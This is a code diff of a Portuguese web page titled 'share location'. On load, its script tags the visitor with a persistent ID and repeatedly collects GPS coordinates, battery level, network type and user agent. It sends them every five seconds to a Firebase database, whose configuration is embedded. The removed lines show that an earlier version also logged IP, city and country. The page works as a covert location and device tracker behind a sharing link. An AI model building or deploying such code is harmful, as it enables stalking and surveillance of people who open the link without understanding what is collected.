@@ -2,12 +2,9 @@
 <html lang="pt-BR">
 
 <head>
-
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>Compartilhar localização</title>
-
 </head>
 
 <body style="background:#0f0f0f;color:white;text-align:center;padding-top:100px;font-family:Arial">
@@ -20,7 +17,6 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/fireba
 import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
 const firebaseConfig = {
-
 apiKey:"AIzaSyDrtZxbKXk7hjlqBL_BLoZMTBdc5iqBCXo",
 authDomain:"ferramentas-projeto.firebaseapp.com",
 databaseURL:"https://ferramentas-projeto.firebaseio.com/",
@@ -28,54 +24,65 @@ projectId:"ferramentas-projeto",
 storageBucket:"ferramentas-projeto.appspot.com",
 messagingSenderId:"877191590019",
 appId:"1:877191590019:web:152d4d35bdd3024c53abb6"
+};
 
-}
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
 
-const app = initializeApp(firebaseConfig)
-const db = getDatabase(app)
+/* id do usuário */
 
-let id = localStorage.getItem("uid")
+let id = localStorage.getItem("uid");
 
 if(!id){
-
-id = Math.random().toString(36).substr(2,9)
-localStorage.setItem("uid",id)
-
+id = Math.random().toString(36).substr(2,9);
+localStorage.setItem("uid",id);
 }
 
-function start(){
+async function enviar(){
 
-navigator.geolocation.watchPosition(async pos=>{
+navigator.geolocation.getCurrentPosition(async pos=>{
 
-let lat = pos.coords.latitude
-let lng = pos.coords.longitude
+let lat = pos.coords.latitude;
+let lng = pos.coords.longitude;
 
-let bateria = "N/A"
+/* bateria */
+
+let bateria="N/D";
 
 if(navigator.getBattery){
 
-let bat = await navigator.getBattery()
-bateria = Math.floor(bat.level*100)+"%"
+let bat = await navigator.getBattery();
+bateria = Math.floor(bat.level*100)+"%";
 
 }
 
-let conexao = navigator.connection ? navigator.connection.effectiveType : "N/A"
+/* rede */
 
-push(ref(db,"localizacoes"),{
+let rede = navigator.connection ? navigator.connection.effectiveType : "N/D";
+
+/* salvar */
+
+set(ref(db,"usuarios/"+id),{
 
 latitude:lat,
 longitude:lng,
-cidade:info.city,
-pais:info.country_name,
-ip:info.ip,
+bateria:bateria,
+rede:rede,
 celular:navigator.userAgent,
+online:true,
 data:Date.now()
 
-})
+});
 
-/* inicia automaticamente */
+});
 
-start()
+}
+
+/* enviar a cada 5 segundos */
+
+setInterval(enviar,5000);
+
+enviar();
 
 </script>
 
